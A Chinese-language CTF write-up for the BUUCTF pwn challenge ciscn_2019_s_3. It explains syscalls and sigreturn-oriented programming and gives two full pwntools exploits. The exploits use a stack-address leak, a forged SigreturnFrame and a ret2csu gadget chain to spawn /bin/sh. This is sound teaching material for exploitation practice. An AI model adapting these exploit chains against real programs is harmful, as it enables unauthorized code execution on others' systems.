---
title: "BUUCTF Pwn Ciscn_2019_s_3"
date: 2020-03-02T22:41:55+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# ciscn_2019_s_3

![image-20200302224951329](/images/image-20200302224951329.png)

64位开启NX

![image-20200302225042515](/images/image-20200302225042515.png)

main函数直接调用一个vuln()函数，两个系统调用

## syscall

系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如 scanf，puts 等 IO 相关的函数实际上是对系统调用的封装 （read 和 write)）。

32位与64位 系统调用的区别：

\1. 传参方式不同   

\2. 系统调用号 不同

\3. 调用方式 不同

32位：

传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器

调用号：sys_read 的调用号 为 3 sys_write 的调用号 为 4

调用方式: 使用 int 80h 中断进行系统调用

64位：

传参方式：首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器

调用号：sys_read 的调用号 为 0 sys_write 的调用号 为 1 

stub_execve 的调用号 为 59  

stub_rt_sigreturn 的调用号 为 15

调用方式: 使用 syscall 进行系统调用

![image-20200302225145595](/images/image-20200302225145595.png)

我看查看sys_read的栈空间，可以发现允许输入0x400栈只有0x10，存在栈溢出

![image-20200302225233208](/images/image-20200302225233208.png)

还发现一个gadget函数

![image-20200302225800793](/images/image-20200302225800793.png)

有两个赋值给rax 15、59的代码，所以存在2个系统调用

stub_execve 的调用号 为 59  

stub_rt_sigreturn 的调用号 为 15

其中sigreturn是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用

对于sigerturn这个系统调用可以参考ctf-wiki，所以这题有一个srop的考点

https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop

## srop的攻击原理

仔细回顾一下内核在 signal 信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 Signal Frame 中。但是需要注意的是：

Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。

由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。

所以可以通过read伪造一个frame在栈中，然后执行sigreturn的系统调用，对于frame的伪造可以利用pwntools中的SigreturnFrame()函数

本题中不存在/bin/sh字符，所以需要我们手动输入

思路:利用栈溢出首先利用本题的sys_read去读一个/bin/sh，但是需要我们leak出字符串在栈中的地址

因为栈中的位置都是通过偏移确定的，所以要确定栈偏移

找偏移一般先确定栈的地址然后在确定字符串在栈中的地址

栈地址-字符串在栈中的地址 = offset

在main函数开始时rsi存的便是栈地址，我们通过GDB来调试查看

![image-20200302232220566](/images/image-20200302232220566.png)

这里RSI = 0x7fffffffe108

然后我们运行这个程序到read系统调用输入/bin/sh作为一个标志找字符串在栈中的地址

![image-20200302232637961](/images/image-20200302232637961.png)

可以看到为0x7fffffffdff0

然后用0x7fffffffe108-0x7fffffffdff0=0x118得到offset为0x118，所以binsh_addr=栈地址-0x118

因为系统默认的alsr每次运行程序栈地址都不一样需要用write函数动态的泄露出来，因为栈空间只有0x10而write却可以读0x30，所以这里肯定会泄露出rsp的值也就是存的栈的地址，如下图的调试

![image-20200302234209259](/images/image-20200302234209259.png)

```python
#!/usr/bin/env python2
#-*-coding=UTF-8-*-
from pwn import *

#sh = process('./ciscn_2019_s_3')
sh = remote('node3.buuoj.cn',26549)
elf = ELF('./ciscn_2019_s_3')
context(arch = 'amd64', os = 'linux')#log_level='debug')

#main_addr = elf.symbol['main'] #0x4004ed
read_write = 0x4004f1  #ida
sigreturn = 0x4004da   #ida
system_call = 0x400517 #ida

payload = '/bin/sh\x00' + 'a'*0x8 + p64(read_write) 
sh.send(payload)
sh.recv(0x20)
#这里是接收0x20字节之后，再接收0x8的字节也就是栈地址，见上图
binsh_addr = u64(sh.recv(0x8)) - 0x118
#gdb.attach(sh)
#print hex(sh_addr)
log.success('stack_addr: ' + hex(binsh_addr+0x118))
log.success('/bin/sh_offset_addr: ' + hex(binsh_addr))
#构建伪造的frame，在执行sigreturn时执行execve("/bin/sh",0,0)来getshell
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = system_call

payload = 'a'*0x10 + p64(sigreturn) + p64(system_call) + str(frame)
sh.send(payload)
sh.interactive()
```

![image-20200302232059695](/images/image-20200302232059695.png)

解法2

59号系统调用是execve那么就可以想办法控制寄存器的值调用execve("/bin/sh",0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget，__libc_csu_init

![image-20200302235523477](/images/image-20200302235523477.png)

r13的值会给到rdx，让rbx=0，下面call的时候会变为call [r12]，会去call r12指向位置的代码，我们可以调到后面的rop执行，所以需要知道栈的地址，我们获取/bin/sh字符串时也需要知道栈地址。这题刚好在write的时候0x28这个位置是栈上的值，于是通过计算可以得到栈上/bin/sh的地址，即rsp-0x10的值
```
from pwn import *

io=process('./ciscn_2019_s_3')
main=0x0004004ED
execv=0x04004E2
pop_rdi=0x4005a3
pop_rbx_rbp_r12_r13_r14_r15=0x40059A
mov_rdxr13_call=0x0400580 
sys=0x00400517

pl1='/bin/sh\x00'*2+p64(main)
io.send(pl1)
io.recv(0x20)
sh=u64(io.recv(8))-280
print(hex(sh))

pl2='/bin/sh\x00'*2+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(0)*2+p64(sh+0x50)+p64(0)*3
pl2+=p64(mov_rdxr13_call)+p64(execv)
pl2+=p64(pop_rdi)+p64(sh)+p64(sys)
io.send(pl2)

io.interactive()

```

